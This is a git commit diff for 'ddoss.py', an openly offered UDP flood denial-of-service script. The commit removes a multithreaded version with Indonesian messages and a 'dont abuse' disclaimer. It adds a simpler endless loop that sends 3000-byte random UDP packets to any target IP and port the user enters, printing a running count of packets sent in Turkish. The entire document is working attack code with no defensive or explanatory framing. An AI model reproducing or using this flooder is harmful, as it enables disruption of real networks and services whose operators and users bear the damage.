e7844da8a4188645ea55c0257767ec716615edf0
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-08 16:27:33 +0300

    Update ddoss.py

--- ddoss.py
+++ ddoss.py
@@ -17,64 +17,15 @@ print('''
 ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯
                                 
 ''')
-print("dont abuse, dosa tanggung sendiri")
 print("Tools By Kazuya")
-ip = str(input(" Target IP:"))
-port = int(input(" Target Port:"))
-choice = str(input("Serang gak (y/n):"))
-times = int(input(" Packets :"))
-threads = int(input(" Threads:"))
+hedef_ip=raw_input("Target IP: => ")
+hedef_port=input("Target Port: => ")
 
-os.system("clear")
-def run():
-	data = random._urandom(900)
-	i = random.choice(("[â€¢]","[â€¢]","[â€¢]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(i +" Bruhh TOK TOK TOK MISI PAKET !!!")
-		except:
-			print("[X] BAYAR PAKET E MAS!!!")
+bytes=random._urandom(3000)
+sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 
-def run2():
-	data = random._urandom(900)
-	i = random.choice(("[â€¢]","[â€¢]","[â€¢]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +" Bruhh TOK TOK TOK MISI PAKET!!!")
-		except:
-			s.close()
-			print("[X] BAYAR PAKET E MAS!!!")
-
-def run3():
-	data = random._urandom(16)
-	i = random.choice(("[â€¢]","[â€¢]","[â€¢]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +" Bruhh TOK TOK TOK MISI PAKET !!!")
-		except:
-			s.close()
-			print("[X] BAYAR PAKET E MAS!!!")
-
-for y in range(threads):
-	if choice == 'y':
-		th = threading.Thread(target = run)
-		th.start()
-		th = threading.Thread(target = run2)
-		th.start()
-	else:
-		th = threading.Thread(target = run3)
-		th.start()
+sayac=0
+while True:
+	sock.sendto(bytes,(hedef_ip,hedef_port))
+	sayac=sayac+1
+	print("saldiri baslatildi,gonderilen paket:%s"%(sayac))
